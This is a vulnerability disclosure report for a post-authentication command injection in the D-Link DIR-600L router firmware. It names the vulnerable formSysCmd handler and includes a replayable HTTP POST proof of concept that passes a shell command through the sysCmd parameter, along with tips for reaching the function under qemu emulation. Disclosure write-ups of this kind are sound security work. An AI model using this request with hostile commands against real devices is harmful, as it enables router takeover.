### Overview:

Affected Device: DIR-600L Wireless N150

Affected Firmware Version:  DIR-600L韌體 (2.07WWb01)

Vulnerability: post-auth command injection

Firmware Download Link:  <https://www.dlinktw.com.tw/techsupport/download.ashx?file=3088>

Report Email: [zwx918569613@gmail.com](mailto:zwx918569613@gmail.com)

![](Pasted%20image%2020240511214956.png)

### Vulnerability:

This vulnerability is a post-auth command injection that allows attackers to make arbitrary command execution 

The vulnerability is located in the function `formSysCmd (0x0454c94)` within `boa`

![](Pasted%20image%2020240511221419.png)

The above are places where injections happend.
The function passes the parameter `sysCmd` to `system()`, can lead to command execution by crafting command.


### POC:
To reproduce the vulnerability, you can use the actual device or simulate it using qemu. The following POC can be used:

~~~
POST /goform/formSysCmd HTTP/1.1
Host: 192.168.122.15
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.110 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.122.15/index.html
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
If-Modified-Since: Sat, 11 May 2024 08:01:35 GMT
Connection: close

sysCmd=ls%20>%20/1.txt;

~~~

(tips:if you use qemu emulation ur likely to patch a few places to work normally , and the Authentication needs to be patched to get to the vuln function ; if you can get a normal device , just login and replay the poc)
### Impact:

redirected but the command has indeed been executed

![](Pasted%20image%2020240511221823.png)